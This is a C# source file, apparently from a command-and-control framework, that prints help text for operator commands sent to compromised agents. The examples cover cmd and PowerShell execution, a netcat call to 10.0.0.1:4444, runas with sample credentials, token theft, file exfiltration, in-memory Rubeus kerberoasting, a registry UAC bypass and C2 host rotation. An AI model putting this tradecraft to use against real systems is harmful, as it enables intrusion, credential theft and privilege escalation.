using System.Text;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Results;

namespace Client.Interpreter.Strategies;

public class HelpStrategy : ICommandStrategy
{
    public readonly string Keyword = "help";

    private static readonly Dictionary<string, (string Usage, string Description, string? Detail)> _entries =
        new(StringComparer.OrdinalIgnoreCase)
    {
        ["shell"]            = ("shell <command>",                            "Run a command via cmd.exe",                                           "Executes <command> inside cmd.exe /c on the agent.\nExample: shell whoami /all"),
        ["powershell"]       = ("powershell <script>",                        "Run a PowerShell script or one-liner",                                "Passes <script> to powershell.exe -NonInteractive -EncodedCommand.\nExample: powershell Get-Process"),
        ["run"]              = ("run <path> [args]",                          "Execute a binary on disk",                                            "Spawns <path> directly, optionally with [args].\nExample: run C:\\Tools\\nc.exe 10.0.0.1 4444"),
        ["runas"]            = ("runas <domain\\user> <password> <cmd> [args]", "Run a command as another user",                                    "Creates a process with the supplied credentials.\nExample: runas CORP\\jdoe P@ssw0rd cmd.exe"),
        ["runu"]             = ("runu <pid> <path> [args]",                   "Run a binary under another process's token",                          "Steals the token of <pid> and launches <path>.\nExample: runu 1234 C:\\Windows\\System32\\cmd.exe"),
        ["download"]         = ("download <path> [destination]",               "Pull a file from the agent to the team server",                       "Retrieves <path> from the agent. [destination] defaults to the filename.\nExample: download C:\\Users\\Admin\\secret.txt\nExample: download C:\\tools\\nc.exe nc64.exe"),
        ["upload"]           = ("upload <path>",                              "Push a file from the team server to the agent",                       "Uploads a staged file to <path> on the agent.\nExample: upload C:\\Temp\\tool.exe"),
        ["cancel"]           = ("cancel <taskID>",                            "Cancel an in-progress file download",                                 "Sends a cancellation signal for the chunked download with the given task ID.\nExample: cancel 42"),
        ["execute-assembly"] = ("execute-assembly <path> [args]",             "Execute a .NET assembly in memory",                                   "Loads and runs the managed assembly at <path> without writing to disk.\nExample: execute-assembly C:\\Tools\\Rubeus.exe kerberoast"),
        ["kill"]             = ("kill <pid>",                                 "Terminate a process by PID",                                          "Calls TerminateProcess on the specified PID.\nExample: kill 4321"),
        ["terminate"]        = ("terminate",                                  "Kill this agent",                                                     "Instructs the agent to exit its main loop and terminate the process."),
        ["escalate"]         = ("escalate <regKey> <targetBinary>",           "Escalate privileges via a registry key UAC bypass",                   "Uses <regKey> to hijack a privileged auto-elevated binary.\nExample: escalate HKCU\\...\\ms-settings cmd.exe"),
        ["spawnto"]          = ("spawnto <path>",                             "Set the binary used for sacrificial process spawning",                "All injected post-ex modules are hosted inside this process.\nExample: spawnto C:\\Windows\\System32\\svchost.exe"),
        ["updatehosts"]      = ("updatehosts <host1> [host2 ...]",            "Update the agent's C2 callback host list",                            "Replaces the current host rotation with the supplied list.\nExample: updatehosts 10.0.0.5 10.0.0.6"),
        ["getuid"]           = ("getuid",                                     "Print the current user and integrity level",                          "Returns domain\\user and whether the process is elevated."),
        ["setsleep"]         = ("setsleep <seconds> <jitter%>",               "Set the agent check-in interval and jitter",                          "Updates sleep and jitter without requiring a restart.\nExample: setsleep 30 20"),
        ["help"]             = ("help [command]",                             "Show all commands, or detail for a specific command",                 "With no argument: list every command.\nWith a keyword: show its usage and description.\nExample: help download"),
    };

    public Task<Result<string>> ProcessCommandAsync(int agentID, string command)
    {
        var key = command?.Trim() ?? "";

        if (string.IsNullOrEmpty(key))
        {
            var sb = new StringBuilder();
            sb.AppendLine("Commands:");
            foreach (var (kw, (usage, desc, _)) in _entries.OrderBy(e => e.Key))
                sb.AppendLine($"  {usage,-48}  {desc}");
            sb.Append("Type 'help <command>' for detailed usage.");
            return Task.FromResult<Result<string>>(sb.ToString());
        }

        if (_entries.TryGetValue(key, out var info))
        {
            var sb = new StringBuilder();
            sb.AppendLine($"Usage: {info.Usage}");
            sb.AppendLine(info.Description);
            if (info.Detail is not null)
                sb.Append(info.Detail);
            return Task.FromResult<Result<string>>(sb.ToString().TrimEnd());
        }

        return Task.FromResult<Result<string>>($"No help entry for '{key}'. Type 'help' to list all commands.");
    }
}
